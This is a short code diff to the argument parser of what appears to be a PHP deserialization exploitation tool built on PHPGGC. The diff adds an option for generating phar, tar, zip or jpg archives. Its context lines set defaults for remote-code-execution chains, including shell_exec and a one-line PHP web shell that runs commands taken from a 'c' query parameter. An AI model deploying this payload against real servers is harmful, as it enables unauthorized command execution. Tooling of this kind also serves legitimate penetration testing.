@@ -102,6 +102,7 @@ if __name__ == '__main__':
     # php specific
     phpggc_group = parser.add_argument_group('phpggc')
     phpggc_group.add_argument('--phpggc-path', help="Full path to PHPGGC bin", default="./bin/phpggc/phpggc")
+    phpggc_group.add_argument('--phar', help="Generate phar of the specified format into the output directory of -o", choices=['phar', 'tar', 'zip', 'jpg'])
     phpggc_group.add_argument('--php-function', help="PHP Function used for 'RCE: Function Call', 'RCE: PHP Code' and 'File Write'", default='shell_exec')
     phpggc_group.add_argument('--php-code', help="PHP Code or path to a file used for 'RCE: PHP Code' and 'File Write' chains (ex: exploit.php)", default="<?php var_dump(%%php_function%%($_GET['c'])); ?> %%chain_id%%")
     phpggc_group.add_argument('--phpggc-options', help="Options to pass to PHPGGC command line", default="-f")
